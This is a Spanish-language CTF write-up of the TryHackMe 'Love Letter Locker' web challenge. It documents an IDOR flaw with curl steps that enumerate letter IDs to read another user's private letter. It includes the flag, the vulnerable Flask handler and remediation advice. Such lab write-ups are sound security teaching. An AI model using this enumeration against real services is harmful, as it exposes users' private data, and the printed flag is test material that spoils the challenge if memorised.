# Reporte de Vulnerabilidad — LoveLetter Locker

**Plataforma:** TryHackMe — *Love Letter Locker*
**Categoría:** Web
**Dificultad:** Easy
**Fecha:** 2026-06-29
**Vulnerabilidad:** Insecure Direct Object Reference (IDOR) — CWE-639
**CVSS 3.1:** 6.5 (Medium) — `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N`

---

## 1. Resumen

La aplicación **LoveLetter Locker** permite a los usuarios registrar, almacenar y leer "cartas de amor" privadas. Cada carta recibe un identificador numérico secuencial y se accede a ella mediante la ruta `GET /letter/<id>`.

La aplicación **no valida que el usuario autenticado sea propietario de la carta solicitada**, lo que permite a cualquier usuario autenticado leer las cartas de **cualquier otro usuario** simplemente iterando el parámetro `id`.

---

## 2. Hallazgo (Flag)

```
THM{1_c4n_r3ad_4ll_l3tters_w1th_th1s_1d0r}
```

Obtenida al solicitar la carta con `id=1`, perteneciente al usuario `Gonz0`, mientras la sesión activa correspondía a un usuario recién registrado (`hacker1`).

---

## 3. Entorno y Reconocimiento

| Elemento       | Valor                                          |
|----------------|------------------------------------------------|
| URL            | `http://10.64.175.70:5000`                     |
| Servidor       | Werkzeug/3.1.5 — Python/3.12.3 (Flask)         |
| Autenticación  | Cookie de sesión Flask (`session=...`, HttpOnly) |
| Pistas UI      | *"Every love letter gets a unique number in the archive. Numbers make everything easier to find."* |

Pistas recogidas de la propia aplicación que guiaron la explotación:

- La página `/letters` mostraba el **total de cartas del archivo** (no solo del usuario), confirmando IDs compartidos globalmente.
- La pista de "Cupid" apuntaba directamente a que los IDs numéricos eran la clave del reto.

---

## 4. Reproducción

### Paso 1 — Registrar una cuenta nueva

```bash
curl -s -c /tmp/cookies.txt -X POST \
  http://10.64.175.70:5000/register \
  -d "username=hacker1&password=hacker123"
```

### Paso 2 — Iniciar sesión

```bash
curl -s -c /tmp/cookies.txt -b /tmp/cookies.txt -X POST \
  http://10.64.175.70:5000/login \
  -d "username=hacker1&password=hacker123"
```

Respuesta: `302 Location: /letters` + cookie `session=` con la sesión activa.

### Paso 3 — Solicitar carta ajena por ID

```bash
curl -s -b /tmp/cookies.txt http://10.64.175.70:5000/letter/1
```

La carta con `id=1` pertenece al usuario `Gonz0`, pero la aplicación la entrega sin verificar la propiedad:

```html
<section class="card">
  <h2>💌 To my secret Valentine ❤️</h2>
  <span class="pill">Letter #1</span>
  <pre class="letter">My dearest...

THM{1_c4n_r3ad_4ll_l3tters_w1th_th1s_1d0r}

Forever yours,
Gonz0</pre>
</section>
```

---

## 5. Causa Raíz

El handler de Flask correspondiente a `/letter/<int:letter_id>` realiza únicamente:

1. Búsqueda de la carta por ID (`SELECT * FROM letters WHERE id = ?`).
2. Renderizado de la plantilla con el contenido.

**No consulta ni compara `letter.user_id` con el `user_id` de la sesión actual.**

Forma insegura (paradigmática):

```python
@app.get("/letter/<int:letter_id>")
@login_required
def view_letter(letter_id):
    letter = db.execute(
        "SELECT * FROM letters WHERE id = ?", (letter_id,)
    ).fetchone()
    if letter is None:
        abort(404)
    return render_template("letter.html", letter=letter)
```

Forma correcta:

```python
letter = db.execute(
    "SELECT * FROM letters WHERE id = ? AND user_id = ?",
    (letter_id, current_user.id)
).fetchone()
```

---

## 6. Impacto

- **Confidencialidad (Alta):** Cualquier usuario autenticado puede leer el contenido íntegro de las cartas de todos los demás usuarios.
- **Escala:** Total — basta iterar `id` desde `1` hasta `N` (el contador `Total letters in Cupid's archive` se filtra en `/letters`, exponiendo el límite superior).
- **Privacidad:** El contexto temático (cartas de amor) amplifica el impacto reputacional, aunque la vulnerabilidad es independiente del contenido.

---

## 7. Remediación

1. **Filtrar por propietario en la consulta:**
   ```sql
   SELECT * FROM letters WHERE id = ? AND user_id = ?
   ```
2. **Doble verificación en la lógica de aplicación** cuando el modelo no permita restricciones en BD.
3. **IDs no enumerables** (UUID v4 o `secrets.token_urlsafe(16)`) para reducir la superficie de ataque, aunque **no sustituyen** el control de autorización — siguen siendo necesarios.
4. **Rate limiting y logging** de accesos fallidos por ID ajeno (defensa en profundidad / detección).
5. **Pruebas automatizadas** que verifiquen que `User A` recibe `403/404` al solicitar recursos de `User B`.

---

## 8. Lecciones Aprendidas

- La **autenticación no es autorización**: exigir login no protege recursos individuales.
- El parámetro más simple (`?id=1`) sigue siendo uno de los más explotados (ver OWASP API1:2023 — *Broken Object Level Authorization*).
- Filtrar el contador global (`Total letters`) alimenta directamente al atacante: nunca revelar cardinalidades que no necesite el usuario legítimo.

---

*Reporte generado a partir del reto completado el 2026-06-29.*